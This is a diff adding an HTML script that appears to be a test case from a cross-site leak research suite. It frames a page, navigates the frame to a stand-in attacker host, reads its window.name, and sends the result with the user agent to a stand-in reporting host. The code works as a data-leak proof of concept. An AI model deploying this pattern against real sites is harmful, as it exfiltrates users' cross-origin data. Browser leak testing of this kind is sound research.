@@ -1,0 +1,40 @@
+<script>
+    window.onload = function () {
+        var results = {};
+
+        function run_window(url, cb) {
+                cb();
+        }
+
+        function run_iframe(url, cb) {
+            var iframe = document.createElement("iframe");
+            document.body.appendChild(iframe);
+            iframe.src = url;
+            setTimeout(function () {
+                iframe.src = "https://attack.er";
+            }, 1000);
+            setTimeout(function () {
+                console.log("accessing target.name");
+                results["iframe"] = iframe.contentWindow.name;
+                console.log("target.name: " + iframe.contentWindow.name);
+                cb();
+            }, 2000);
+        }
+
+        function report() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://re.port/case29.json/" + btoa(JSON.stringify({
+                "user-agent": navigator.userAgent,
+                "detected_window_name": results["window"],
+                "detected_iframe_name": results["iframe"],
+                "xsleak_reproduced": results["window"]  === "foobar123" || results["iframe"] === "foobar123"
+            })));
+            xhr.send();
+        }
+
+        run_window("https://leak.test/custom/case29/main/", function () {
+                run_iframe("https://leak.test/custom/case29/main/", report);
+            }
+        );
+    };
+</script>
